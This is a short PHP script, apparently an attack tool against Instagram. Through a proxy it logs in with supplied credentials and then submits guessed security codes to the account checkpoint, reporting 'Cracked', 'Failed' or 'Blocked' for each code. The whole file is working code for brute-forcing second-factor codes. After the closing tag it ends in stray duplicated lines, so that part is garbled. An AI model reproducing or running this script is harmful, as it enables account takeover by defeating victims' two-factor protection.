<?
// http://www.mughniagent.co.uk/instagram/proxy.php?proxy=[]&mid=[]&user=[]&pass=[]&code=[]
$proxy = $_GET['proxy'];
$username = $_GET['user'];
$password = $_GET['pass'];
$code = $_GET['code'];
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/"); 
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.instagram.com',
    'X-CSRFToken: F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1',
    'X-Instagram-AJAX: 1',
    'X-Requested-With: XMLHttpRequest',
    'Referer: https://www.instagram.com/',
    'Cookie: csrftoken=F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1;'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, "username=$username&password=$password");
curl_setopt($ch, CURLOPT_HEADER, 1);
$check = curl_exec($ch);
if(eregi('checkpoint', $check))
{
$starturl = explode('"checkpoint_url": "' , $check );
$endurl = explode('"' , $starturl[1] );
$uri = $endurl[0];
$url = "https://www.instagram.com$uri";

$instagram = curl_init(); 
curl_setopt($instagram, CURLOPT_URL, $url); 
curl_setopt($instagram, CURLOPT_PROXY, $proxy);
curl_setopt($instagram, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($instagram, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($instagram, CURLOPT_HTTPHEADER, array(
    'X-CSRFToken: F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1',
    'X-Instagram-AJAX: 1',
    "Referer: $url",
    "Cookie: mid=WWy-QQAEAAE56m6cNeNkhixRJvwg; csrftoken=F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1;"
    ));
curl_setopt($instagram, CURLOPT_POSTFIELDS, "security_code=$code");
curl_setopt($instagram, CURLOPT_HEADER, 1);
$response = curl_exec($instagram);
if(eregi('"location": "https://www.instagram.com/"', $response))
	{
		echo "Cracked -> ${code}";
	}
	else
	{
		if(eregi("Please check the code we sent you and try again.", $response))
		{
			echo "Failed -> ${code}";
		}
		else
		{
			if(eregi("This field is required.", $response))
			{
				echo "MID : WWy-QQAEAAE56m6cNeNkhixRJvwg fail";
			}
			else
			{
				if(eregi("Please wait a few minutes before you try again.", $response))
				{
					echo "Please wait [Blocked]->${code}";
				}
				else
				{
					if(eregi("You've entered the code incorrectly too many times.", $response))
					{
						echo "Blocked Dude :( [${code}]";
					}
					else
					{
						echo $response ;
					}
				}
			}
		}
	}
curl_close($instagram);
}
else
{
 echo "where is 2FA Bro ???";
}
curl_close($ch);
?>
			}
		}
	}
curl_close($instagram);
?>
